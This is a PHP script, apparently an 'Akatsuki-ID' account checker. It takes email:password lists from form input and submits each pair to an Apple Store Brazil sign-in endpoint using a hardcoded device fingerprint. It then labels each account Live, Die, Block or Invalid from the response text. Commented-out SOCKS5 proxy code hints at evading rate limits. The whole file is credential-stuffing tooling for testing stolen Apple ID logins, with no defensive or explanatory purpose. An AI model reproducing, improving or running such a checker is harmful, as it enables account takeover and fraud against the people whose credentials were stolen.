<?php
require ('./class_curl.php');

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}


if ($_POST['do'] == 'check')
{

    $curl = new curl();
    delete_cookies();
    $curl->ua('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10');
 

    $result = array();
    $delim = urldecode($_POST['delim']);
    list($email, $pwd) = explode($delim, urldecode($_POST['mailpass']));
//   $sock = urldecode($_POST['IP']);

    if (!$email)
    {
        $result['error'] = -1;
        $result['msg'] = urldecode($_POST['mailpass']);
        echo json_encode($result);
        exit;
    }
    
    delete_cookies();
 //  $curl->sock5($sock);

	if($curl->validate()){
		$fullink='https://secure2.store.apple.com/br/sentryx/sign_in?login-appleId='.$email.'&login-password='.$pwd.'&deviceID=7Oa44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQBTuX38.WUMnGWVQdg1kzDlSgyyIT2CCs5uQ.gEx4xUC541jlS7spjt.gEngMQEjZrVnH8vSPzH1r6zdstlDJFW73E4QCwby91RZ5Q4350.opxUC54b_H_jXgqNBLyOtJJIqSI6KUMnGWpwoNSUC56MnGWVQdg3ZLQ0Fe.J39FeBKY.awBdo72_AITcfx9MsFr9felpWNiJ5Q4m_n22acPVr9dVjKVeYcJb975y6ezIqUkeicCmeugHVNNW5CfUXtStKjE4PIDxO9sPrsiMTKQnlLZnjwcAUhkY5BSmmY5BNnOVgw24uy..Z3&fdcBrowserData=%257B%2522U%2522%253A%2522Mozilla%252F5.0%2520(Windows%2520NT%25206.3%253B%2520rv%253A36.0)%2520Gecko%252F20100101%2520Firefox%252F36.0%2522%252C%2522L%2522%253A%2522pt-BR%2522%252C%2522Z%2522%253A%2522GMT-03%253A00%2522%252C%2522V%2522%253A%25221.0%2522%257D&_a=login.sign&c=2e8c6eae1476becad6b6aa010fe31022&_fid=si&r=SCDHYHP7CY4H9XK2H&s=2e8c6eae1476becad6b6aa010fe31022&t=S99KKATD9FP9FHCP4';
		$curl->page($fullink);
		
		if($curl->validate()){
		
		
		
			 
			 if(stripos($curl->content, '{"head":{"data":{"url":"http://store.apple.com/br"},"status":"302"},"body":{}}') !== false){
			 	$result['error'] = 0;
				$result['msg'] = '<b style="color:yellow;">Live</b> => ' . $email .
                        ' | ' .$pwd.'| Checked On Akatsuki-ID'; 			
			 

			 }				
						
			 elseif(stripos($curl->content, '"action":"O ID Apple ou senha foi inserido incorretamente."') !== false){
			 
				$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Die</b> => ' . $email . ' | ' . $pwd.' | Checked On Akatsuki-ID'; 

			 }
			
			 elseif(stripos($curl->content, '"action":"Este ID Apple foi desativado por motivos de segurança. Visite iForgot para redefinir sua conta (http://iforgot.apple.com)."') !== false){
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Block</b> => ' . $email . ' | ' . $pwd.' | Checked On Akatsuki-ID'; 
				 }
				 elseif(stripos($curl->content, '{"head":{"data":{"url":"http://store.apple.com/br/sorry_message/illegal_arguments"},"status":"302"},"body":{}}') !== false){
			 
					 
			 	$result['error'] = 2;
                $result['msg'] = '<b style="color:red;">Invalid</b> => ' . $email . ' | ' . $pwd.' | Checked On Akatsuki-ID'; 
			 }
				 else{
			 		 
			 	$result['error'] = 0;
                $result['msg'] = '<b style="color:yellow;">Live</b> => ' . $email . ' | ' . $pwd.' | [ACC: Apple] Checked On Akatsuki-ID'; 
			 }
							
		}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
		}	
		
	
	
	}else{
	
	
		$result['error'] = 1;
        $result['msg'] = $sock . ' => Die/Timeout1';
	
	}
	
	

    echo json_encode($result);
    exit;

}

?>